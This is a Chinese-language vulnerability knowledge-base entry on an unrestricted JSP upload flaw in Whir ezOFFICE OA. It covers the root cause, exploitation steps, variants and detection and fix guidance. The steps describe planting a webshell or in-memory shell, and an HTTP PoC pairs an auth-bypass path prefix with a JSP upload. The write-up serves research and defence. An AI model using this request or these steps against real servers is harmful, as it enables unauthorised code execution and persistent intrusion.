---
id: web-generic-file-upload-whir-ezoffice-fileupload-action-extension
title: 万户OA FileUploadAction 任意文件上传：/defaultroot/upload/fileUpload 保留原始后缀写 Web 目录
type: scenario
domain: web
path: web/generic/file-upload
technique: whir-ezoffice-fileupload-action-unrestricted-upload
tags:
- web
- file-upload
- java
- oa
- whir
- ezoffice
- webshell
- jsp
- unauth
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:22+08:00'
  notes: 已对照原文与 img33-36 核对：FileUploadAction /defaultroot/upload/fileUpload、createFileName 取原始后缀+随机数、saveFileFromInputStream 写入 /upload/html 或 /upload/<modelName>，与代码一致；原文未给出上传成功/webshell 执行截图，未复跑。
url: /docs/web/generic/file-upload/web-generic-file-upload-whir-ezoffice-fileupload-action-extension/
draft: false
kb_aliases:
- 万户OA 任意文件上传
- ezOFFICE FileUploadAction
- /upload/fileUpload
- createFileName 后缀拼接
- saveFileFromInputStream
---

## 一句话结论

万户OA 的 `FileUploadAction#fileUpload`（路由 `/defaultroot/upload/fileUpload`）遍历 multipart 文件，用 `createFileName` 取原始文件名最后一个点后的后缀并拼随机数作为新文件名，再通过 `saveFileFromInputStream` 写入 `realPath("/upload")/html` 或 `realPath("/upload")/模型名`；不校验后缀/内容，上传 `.jsp` 等脚本即可写入 Web 目录。

## 原理

- `FileUploadAction` 类 `@RequestMapping({"/upload"})`，方法 `fileUpload(MultipartHttpServletRequest, HttpServletResponse)` 映射 `/fileUpload`，完整路由 `/defaultroot/upload/fileUpload`。
- 上传目录：
  - `modelName = multipartRequest.getParameter("modelName")`；
  - `modelName` 为空时 `uploadFileUrl = getRealPath("/upload") + File.separator + "html"`；
  - 非空时 `uploadFileUrl = getRealPath("/upload") + File.separator + modelName + ...`；
  - `new File(uploadFileUrl).mkdirs()` 自动建目录。
- 文件处理：遍历 `multipartRequest.getFileNames()`，对每个 `MultipartFile imgFile`：
  - `fileName = imgFile.getOriginalFilename()`；
  - `newFileName = createFileName(fileName)`：`postfix = fileName.substring(fileName.lastIndexOf("."))`，`return random + postfix`——后缀完全取自客户端；
  - 若 `FTP_UPLOAD_FLAG.equals(fileUploadType)` 走 `ftpUpload`，否则 `saveFileFromInputStream(imgFile.getInputStream(), uploadFileUrl, newFileName)`；
  - `saveFileFromInputStream` 用 `new File(path + "/" + fileName)` + `FileOutputStream` 原样写入，不校验扩展名、MIME 或内容。
- 上传后的文件可通过 `/upload/html/<random>.jsp` 或 `/upload/<modelName>/<random>.jsp` 访问；JSP 会被容器解析执行。接口正常需登录，但可配合鉴权绕过未授权上传。

## 触发条件

- 目标为万户OA/ezOFFICE，`/defaultroot/upload/fileUpload` 可达。
- 上传目录 `upload/html` 或 `upload/<modelName>` 位于 Web 根下且容器解析 JSP。
- 攻击者能到达上传接口（登录或鉴权绕过）。
- 服务器未对上传目录禁用脚本执行。

## 利用步骤

1. 用鉴权绕过前缀请求 `/defaultroot/upload/fileUpload`，构造 multipart 上传测试文件 `test.jsp`。
2. 从响应/目录结构推断随机文件名（`createFileName` 为随机数+后缀）；可通过上传同名/可预测随机数、响应回显或目录爆破定位。
3. 访问 `/upload/html/<random>.jsp`，确认脚本执行。
4. 上传 webshell/内存马；必要时用 `modelName` 控制子目录。
5. 记录上传请求、文件名与访问结果，验证后清理。

## PoC

```http
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../upload/fileUpload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----123

------123
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: text/plain

<% out.print("ok"); %>
------123--
```

说明：`createFileName` 生成 `<随机数>.jsp`，实际文件名需按响应/目录确定；原文未给出上传成功响应截图。

## 变体与关联

- 变体：后缀改为 `.jspx`、`.war` 等；`modelName` 可控制子目录；FTP 模式上传到远端。
- 变体：`createFileName` 的 `Random` 可预测性有限，可通过上传多个文件/响应差异/目录列举定位。
- 关联：鉴权绕过 [[web-generic-auth-whir-ezoffice-characterencoding-filter-bypass]]；同产品删除 [[web-generic-file-inclusion-whir-ezoffice-deletefile-traversal-delete]]；通用上传 [[web-generic-file-upload-extension-zero-check]]。
- 边界：上传目录禁止 JSP 解析、后缀白名单、上传接口强制登录且无绕过、落盘到非 Web 目录时 webshell 不成立。

## 检测与防御

- 检测：`/upload/fileUpload` 请求的 filename 为 `.jsp`/`.jspx`；`upload/html`、`upload/<modelName>` 下出现脚本文件；响应返回随机数文件名后紧跟对 `/upload/` 的访问。
- 修复：上传后缀白名单 + 内容类型/魔数校验；服务端生成文件名并丢弃客户端后缀；上传目录移出 Web 根或禁止脚本解析；上传接口独立鉴权。
- 加固：`modelName` 白名单/路径规范化；限制上传大小；监控上传目录中的可执行文件；修复鉴权过滤器绕过。
